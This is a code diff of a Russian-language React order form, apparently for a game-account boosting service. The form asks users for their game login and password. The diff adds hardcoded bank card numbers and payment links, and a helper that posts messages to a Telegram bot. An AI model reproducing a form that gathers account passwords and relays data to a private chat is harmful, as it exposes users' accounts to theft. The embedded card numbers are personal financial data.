@@ -71,6 +71,14 @@
       "Открыть косатку для покупки",
     ];
 
+    const REQUISITES = [
+      { name: "💚 Сбербанк",   number: "2202 2032 9079 4421" },
+      { name: "❤️ Альфа-Банк", number: "2200 1509 9435 5391" },
+      { name: "💛 Т-Банк",     number: "2200 7001 1816 8359" },
+      { name: "🌐 Donatty",    url: "donatty.com/marktvenboost" },
+      { name: "💛 ЮMoney",     url: "yoomoney.ru/to/410014747956154" }
+    ];
+
     /* ================= Утилиты ================= */
     const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/i;
     const Req = () => <span className="text-red-500">*</span>;
@@ -95,6 +103,17 @@
       const r=await fetch(u.toString(),{method:"POST"});
       if(!r.ok) throw new Error(await r.text());
       return r.json();
+    }
+
+    async function sendTelegramMessage(text){
+      if(!TG_BOT_TOKEN || !TG_CHAT_ID) return;
+      try{
+        const r=await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`,{
+          method:"POST", headers:{"Content-Type":"application/json"},
+          body:JSON.stringify({ chat_id:TG_CHAT_ID, text, parse_mode:"HTML", disable_web_page_preview:true })
+        });
+        if(!r.ok) console.warn("Telegram error:", await r.text());
+      }catch(e){ console.warn("Telegram send failed:", e?.message||e); }
     }
 
     /* ================= Компонент ================= */
@@ -127,10 +146,10 @@
       const loginNeedsEmail = launcher==="EpicGames" || launcher==="SocialClub";
 
       // прогресс-бар
-      const progress = React.useMemo(()=>(
+      const progress = React.useMemo(() => (
         !!launcher && !!version && login.trim() && password.trim() && 
         (money !== null || noMoney) && level && contacts.trim()
-      ), [launcher,version,login,password,money,noMoney,level,contacts]);
+      ), [launcher, version, login, password, money, noMoney, level, contacts]);
 
       const canSubmit = React.useMemo(() => progress, [progress]);
 
@@ -341,14 +360,18 @@
                 <div className="grid gap-4">
                   <div>
                     <label htmlFor="paymentBank" className="block text-sm font-medium mb-1">Банк</label>
-                    <input
-                      type="text"
+                    <select
+                      id="paymentBank"
                       className="w-full rounded-xl bg-slate-50 dark:bg-slate-900/60 border px-4 py-2 outline-none focus:border-emerald-400 transition"
-                      placeholder="Укажите банк"
                       value={paymentBank}
                       onChange={(e) => setPaymentBank(e.target.value)}
                       required
-                    />
+                    >
+                      <option value="" disabled>Выберите банк</option>
+                      {REQUISITES.map((r, index) => (
+                        <option key={index} value={r.name}>{r.name}</option>
+                      ))}
+                    </select>
                   </div>
                   <div>
                     <label htmlFor="paymentTime" className="block text-sm font-medium mb-1">Время оплаты</label>
@@ -375,6 +398,52 @@
                   onChange={(e) => setContacts(e.target.value.trim())}
                   required
                 />
+              </section>
+
+              {/* Реквизиты для перевода */}
+              <section className="bg-white dark:bg-slate-800/60 rounded-2xl shadow-inner p-6 border border-slate-200 dark:border-slate-700">
+                <h3 className="text-center text-lg font-semibold mb-4">Реквизиты для перевода:</h3>
+                <div className="max-w-2xl mx-auto space-y-3">
+                  {REQUISITES.map((r,i)=>{
+                    const isRevealed = !!revealedRequisites[i];
+                    const canCopy = r.number || r.url;
+                    const valueToCopy = r.number || r.url || "";
+                    return (
+                      <div key={i} className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-2 whitespace-nowrap">
+                        <div className="flex items-center gap-2">
+                          <span className="font-medium">{r.name}</span>
+                          {!isRevealed && <span className="text-xs text-slate-500 dark:text-slate-400">(скрыто)</span>}
+                        </div>
+                        <div className="flex items-center gap-2">
+                          {!isRevealed ? (
+                            <button
+                              type="button"
+                              className="press text-xs px-3 py-1 rounded-md border border-slate-300 dark:border-slate-600 hover:bg-slate-50 dark:hover:bg-slate-700"
+                              onClick={() => setRevealedRequisites(prev => ({ ...prev, [i]: true }))}
+                            >
+                              Показать
+                            </button>
+                          ) : (
+                            <>
+                              <span className="text-sm overflow-hidden text-ellipsis">
+                                {r.number ? r.number : r.url}
+                              </span>
+                              {canCopy && (
+                                <button
+                                  type="button"
+                                  className="press text-xs px-3 py-1 rounded-md border border-slate-300 dark:border-slate-600 hover:bg-slate-50 dark:hover:bg-slate-700"
+                                  onClick={()=>copyToClipboard(valueToCopy)}
+                                >
+                                  Копировать
+                                </button>
+                              )}
+                            </>
+                          )}
+                        </div>
+                      </div>
+                    );
+                  })}
+                </div>
               </section>
 
               {/* Кнопки */}
